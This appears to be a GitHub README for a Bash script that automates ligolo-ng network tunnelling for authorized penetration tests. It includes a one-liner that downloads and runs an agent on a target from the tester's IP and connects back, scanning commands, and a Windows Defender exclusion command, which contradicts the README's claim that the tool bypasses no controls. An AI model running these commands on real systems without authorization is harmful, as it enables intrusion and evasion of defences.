<div align="center">

<picture>
  <source media="(prefers-color-scheme: dark)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/LigoloSupport/main/docs/assets/logo-dark.svg">
  <source media="(prefers-color-scheme: light)" srcset="https://raw.githubusercontent.com/Real-Fruit-Snacks/LigoloSupport/main/docs/assets/logo-light.svg">
  <img alt="LigoloSupport" src="https://raw.githubusercontent.com/Real-Fruit-Snacks/LigoloSupport/main/docs/assets/logo-dark.svg" width="520">
</picture>

![Bash](https://img.shields.io/badge/language-Bash-orange.svg)
![Platform](https://img.shields.io/badge/platform-Linux-lightgrey)
![License](https://img.shields.io/badge/license-MIT-blue.svg)

**One-command setup script for ligolo-ng tunneling.**

Auto-downloads proxy and agent binaries, configures TUN interface, starts a file server for agent transfer, and provides copy-paste commands with your IP pre-filled. No proxychains needed -- access target networks directly.

> **Authorization Required**: Designed exclusively for authorized security testing with explicit written permission.

</div>

---

## Quick Start

### Prerequisites

- **Linux** (Kali, Ubuntu, Debian) with root/sudo
- **curl**, **jq**, **tar** (binary download and extraction)
- **python3** (optional, for HTTP file server)

### Install

```bash
curl -O https://raw.githubusercontent.com/Real-Fruit-Snacks/LigoloSupport/main/ligolo-helper.sh
chmod +x ligolo-helper.sh
```

### Run

```bash
sudo ./ligolo-helper.sh auto
```

Follow the on-screen instructions to transfer the agent, connect, select a session, add routes, and start the tunnel.

### Verify

```bash
# After tunnel is running, test connectivity
nmap -sV 10.10.10.0/24           # Scan target network
ssh user@10.10.10.20             # SSH to internal host
curl http://10.10.10.50          # Access internal web server
```

### Cleanup

```bash
sudo ./ligolo-helper.sh cleanup
```

---

## Features

### One-Command Setup

Run `sudo ./ligolo-helper.sh auto` and the script downloads ligolo-ng binaries, creates the TUN interface, starts a file server on port 8000, and launches the proxy.

```bash
sudo ./ligolo-helper.sh auto
```

### Auto IP Detection

Automatically detects your attack IP by checking `tun0`, `tun1`, `tap0`, and the default route in priority order. All generated commands use your actual IP.

```bash
# Detection order: tun0 -> tun1 -> tap0 -> default route
```

### Multi-Platform Agents

Downloads agent binaries for Linux (amd64/arm64), Windows (amd64), and macOS (arm64). Transfer commands provided for each platform including curl, PowerShell `iwr`, and certutil fallback.

```bash
./ligolo-helper.sh agent-cmd            # Show all agent commands
./ligolo-helper.sh agent-cmd 10.0.0.1   # With custom IP
```

### Clean Teardown

Removes all routes, stops the file server and proxy, and tears down the TUN interface in order. No orphaned processes or stale routes left behind.

```bash
sudo ./ligolo-helper.sh cleanup
```

### Modular Commands

Each operation is available as a standalone subcommand for granular control over the setup process.

```bash
./ligolo-helper.sh download              # Download binaries only
sudo ./ligolo-helper.sh setup-tun        # Create TUN only
sudo ./ligolo-helper.sh add-route 10.10.10.0/24
./ligolo-helper.sh status                # Show current state
```

### Step-by-Step Guidance

After setup, the script displays numbered steps with exact commands for agent transfer, connection, session selection, route addition, and tunnel start.

```
STEP 1: Download agent on target machine
  curl http://10.10.14.5:8000/ligolo-agent -o /tmp/a && chmod +x /tmp/a
STEP 2: Run agent on target
  /tmp/a -connect 10.10.14.5:11601 -ignore-cert
```

---

## Architecture

```
ligolo-helper.sh    Single-file setup script (all logic)
README.md           Documentation
LICENSE             MIT License
```

The script follows a linear execution flow: download binaries from GitHub releases, create a TUN interface via `ip tuntap`, start a Python HTTP file server for agent transfer, then launch `ligolo-proxy` with a trap to clean up on exit.

---

## All Commands

| Command | Root | Description |
|---------|------|-------------|
| `auto` | Yes | Full setup -- download, configure, start proxy |
| `cleanup` | Yes | Stop proxy, file server, remove routes and TUN |
| `download` | No | Download ligolo-ng binaries to `~/.ligolo-ng` |
| `setup-tun` | Yes | Create and activate TUN interface |
| `teardown-tun` | Yes | Remove TUN interface |
| `proxy [opts]` | No | Start proxy with custom options |
| `add-route <cidr>` | Yes | Add route to TUN |
| `del-route <cidr>` | Yes | Remove route from TUN |
| `agent-cmd [ip]` | No | Show agent commands for all platforms |
| `status` | No | Show binary, TUN, route, and proxy status |

---

## Configuration

| Variable | Default | Description |
|----------|---------|-------------|
| `LIGOLO_DIR` | `~/.ligolo-ng` | Binary storage directory |
| `TUN_NAME` | `ligolo` | TUN interface name |
| `PROXY_PORT` | `11601` | Proxy listen port |

```bash
PROXY_PORT=443 sudo ./ligolo-helper.sh auto
LIGOLO_DIR=/opt/ligolo sudo ./ligolo-helper.sh download
```

---

## Troubleshooting

**Agent won't connect** -- Ensure the proxy port is open:
```bash
iptables -I INPUT -p tcp --dport 11601 -j ACCEPT
```

**Windows Defender blocks agent** -- Add exclusion before downloading:
```powershell
Add-MpPreference -ExclusionPath "C:\Users\Administrator\a.exe"
```

**Connection drops when adding route** -- Do not route the target's own network through ligolo. Route only the internal networks behind the target.

**Invalid CIDR prefix** -- The network address must align to the prefix boundary (e.g., `10.1.146.0/24`, not `10.1.146.5/24`).

---

## Security

Report vulnerabilities via [SECURITY.md](SECURITY.md) -- do not open public issues.

LigoloSupport does **not**:

- Modify ligolo-ng source code or binaries
- Store credentials or sensitive data
- Persist after cleanup
- Open ports other than the proxy port and file server
- Bypass any security controls

---

## Credits

- [ligolo-ng](https://github.com/nicocha30/ligolo-ng) by Nicolas Chatelain
- [Official Documentation](https://docs.ligolo.ng/)

---

## License

[MIT](LICENSE) -- Copyright 2026 Real-Fruit-Snacks
